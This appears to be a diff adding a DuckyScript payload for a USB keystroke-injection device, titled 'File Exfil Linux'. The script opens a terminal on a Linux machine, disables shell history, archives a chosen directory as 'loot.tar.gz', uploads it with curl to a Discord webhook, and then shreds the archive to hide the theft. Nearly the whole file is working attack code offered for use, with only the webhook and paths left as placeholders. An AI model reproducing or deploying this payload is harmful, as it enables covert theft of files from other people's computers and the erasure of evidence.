@@ -1,0 +1,30 @@
+REM TITLE: File Exfil Linux
+REM AUTHOR: OSINTI4L
+REM TARGET OS: Linux (tested on Kali Linux)
+REM DESCRIPTION: Creates tarball of target file directory recursively. Disables terminal session history, exfiltrates tarball via Discord webhook, then shreds tarball locally to obfuscate itself. To be functional: add Discord webhook to line 21 and target directory to lines 14/23. If exfiltrating large amounts of files, increase DELAY on line 18.
+
+REM Begin attack:
+ATTACKMODE HID
+    DELAY 1000
+
+REM Opening terminal window, disabling history, and changing to target directory:
+CTRL ALT t
+    DELAY 150
+    STRINGLN unset HISTFILE
+    cd /PATH/TO/DIRECTORY
+
+REM Creating tarball (loot.tar.gz) of all files in current working directory:
+STRINGLN tar -czf loot.tar.gz *
+    DELAY 500
+
+REM Exfiltrating "loot.tar.gz" via Discord webhook:
+DEFINE WEBHOOK_URL https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK
+    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
+    STRINGLN -F "file=@/ADD/PATH/TO/TARGET/DIRECTORY/loot.tar.gz" \
+    STRINGLN -F "content=$ Loot Incoming $" \
+    STRINGLN WEBHOOK_URL
+ 	   DELAY 100
+
+REM Obfuscation stage, shred tarball and exit:
+STRINGLN shred -fu loot.tar.gz
+    STRINGLN exit
